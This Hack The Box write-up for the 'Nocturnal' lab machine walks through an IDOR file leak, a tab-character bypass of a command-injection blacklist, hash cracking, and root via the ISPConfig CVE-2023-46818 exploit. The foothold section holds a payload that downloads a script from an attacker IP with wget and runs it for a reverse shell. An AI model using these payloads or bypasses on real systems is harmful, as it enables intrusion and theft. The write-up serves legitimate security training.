@@ -1,0 +1,131 @@
+Title: Nocturnal
+Tag: HTB
+Date: 2025-01-01
+
+# Overview
+
+Nocturnal was a Linux box built around a document management site that let users upload and store Word, Excel, and PDF files with server-side backups. An Insecure Direct Object Reference in the file download endpoint allowed browsing other registered users' stored files by fuzzing usernames, which leaked an .odt file containing a plaintext password. That password didn't work over SSH but did work on the site's own admin panel, which exposed the application's PHP source, including a backup feature whose command-injection blacklist could be bypassed with a tab character in place of a blocked space, giving remote code execution as the web server. A local SQLite-style database file leaked further password hashes, one of which cracked and worked over SSH for a second user. On the box, a locally-bound service on port 8080 turned out to be an ISPConfig control panel reachable with the same cracked credentials, and a known authenticated PHP code injection vulnerability in its language file editor gave a root shell.
+
+## Recon
+
+```
+> nmap -T4 -p- --min-rate 2000 10.10.11.64
+22/tcp open  ssh
+80/tcp open  http
+
+> nmap -sC -sV -p22,80 10.10.11.64
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+```
+
+Port 80 redirects to `nocturnal.htb`. The site allows registering an account and uploading Word, Excel, and PDF documents, which it backs up server-side. Nikto flagged a missing `httponly` flag on the session cookie and an admin login page at `/login.php`. Directory brute forcing with dirb found `/admin.php` and a `/backups/` directory. No direct file upload vulnerabilities were found after registering an account and testing the upload feature.
+
+## IDOR in File Download - Leaking Another User's Document
+
+The file download endpoint took both a `username` and a `file` parameter, and returned a fixed-size response for any username without a matching file. Fuzzing the `username` parameter against a names wordlist while filtering out that fixed size revealed which accounts actually existed:
+
+```
+> ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=websh.php.pdf' -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -H 'Cookie:PHPSESSID=...' -fs 2985
+admin
+amanda
+tobias
+```
+
+Substituting `amanda` into the download request (rather than the fixed size, a differently sized 200 response) confirmed access to her stored file, `privacy.odt`. Neither `admin` nor `tobias` had any files stored. The downloaded document contained a plaintext password:
+
+```
+amanda: arHkG7HAI68X8s1J
+```
+
+This password didn't work over SSH, but it did work to log into the site's own admin panel online, which now exposed the application's PHP source code, including every page's logic.
+
+## Foothold - Command Injection in the Backup Feature
+
+Reading the backup functionality's source showed it built a `zip` command by concatenating a password parameter directly into a shell string, guarded by a blacklist filter:
+
+```php
+function cleanEntry($entry) {
+    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];
+    foreach ($blacklist_chars as $char) {
+        if (strpos($entry, $char) !== false) {
+            return false;
+        }
+    }
+    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
+}
+
+$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
+```
+
+The blacklist blocked literal spaces and semicolons but not other whitespace characters. Submitting a payload with a tab character (`%09`) in place of each blocked space bypassed the filter entirely, since the shell still treats a tab as a field separator:
+
+```
+wget%09http://10.10.15.0:7575/test.sh
+sh%09test.sh
+```
+
+Intercepting and modifying the backup request in Burp with this payload downloaded and executed a staged script, catching a reverse shell as the web service account.
+
+## Credential Harvesting - Application Database
+
+Only one user, `tobias`, had a home directory on the box. A database file was found at `/var/www/nocturnal_database`, and even a plain `cat` against it was enough to make out its structure, revealing password hashes for all three application accounts:
+
+```
+tobias:55c82b1ccd55ab219b3b109b07d5061d
+amanda:df8b20aa0c935023f99ea58358fb63c4
+admin:d725aeba143f575736b07e045d8ceebb
+```
+
+Checking the hashes against CrackStation cracked one:
+
+```
+tobias: slowmotionapocalypse
+```
+
+## Lateral Movement - SSH as tobias
+
+```
+> ssh tobias@10.10.11.64
+```
+
+This granted a shell and the user flag.
+
+## Internal Service Discovery - ISPConfig on Port 8080
+
+Standard privilege escalation enumeration (linpeas, `sudo -l`, checking `/var` and `/opt`) turned up nothing directly, but checking listening sockets showed an unexpected locally-bound service:
+
+```
+> ss -tuln
+...:8080  LISTEN
+```
+
+A plain `curl` against it locally returned nothing, but forwarding the port over SSH and browsing it from the attacking machine loaded a full web interface:
+
+```
+> ssh -N -L 1234:localhost:8080 tobias@10.10.11.64
+```
+
+Logging in with `tobias`'s already-cracked password (`slowmotionapocalypse`) worked immediately. The page source revealed the software and version in an asset URL, `ispconfig.css?ver=3.2.2`, identifying the panel as ISPConfig 3.2.2.
+
+## Privilege Escalation - CVE-2023-46818 (ISPConfig Language Editor RCE)
+
+ISPConfig versions before 3.2.11p1 are vulnerable to an authenticated PHP code injection issue in the admin panel's language file editor: when the `admin_allow_langedit` setting is enabled, submitted translation strings are written directly into PHP-executed language files without sanitizing for PHP code, letting an authenticated admin inject and execute arbitrary PHP. A public Python exploit for this issue was used directly against the forwarded panel with the recovered credentials:
+
+```
+> python CVE-2023-46818.py http://localhost:1234/ admin slowmotionapocalypse
+```
+
+This logged in, injected a web shell payload through the language editor, and dropped into a shell running as root, since ISPConfig on this box operated with root privileges.
+
+```
+> cat /root/root.txt
+```
+
+## Takeaways
+
+- File download endpoints keyed on a username and filename pair are a classic IDOR target; fuzzing the username field while filtering out the "no such file" baseline response size is often enough to enumerate every other account's stored files.
+- Documents uploaded to a "secure" file storage app are still worth treating as potential credential leaks, since users frequently store passwords in personal notes or exported office documents.
+- Blacklist-based command injection filters that block specific characters like a literal space are frequently incomplete; alternative whitespace characters such as a tab (`%09`) are commonly missed and still work as shell field separators.
+- Local databases readable directly with basic tools like `cat`, even without a proper client, can still leak structured credential data if the format is simple enough to eyeball.
+- Locally-bound admin panels discovered through listening socket enumeration are worth forwarding and testing with any credentials already recovered, since password reuse between an application account and an internal admin tool is common.
+- Known, patched CVEs in bundled or self-hosted control panel software (like ISPConfig's language editor PHP injection, CVE-2023-46818) remain a reliable path to code execution whenever a box runs an outdated, unpatched version and valid admin credentials can be obtained.
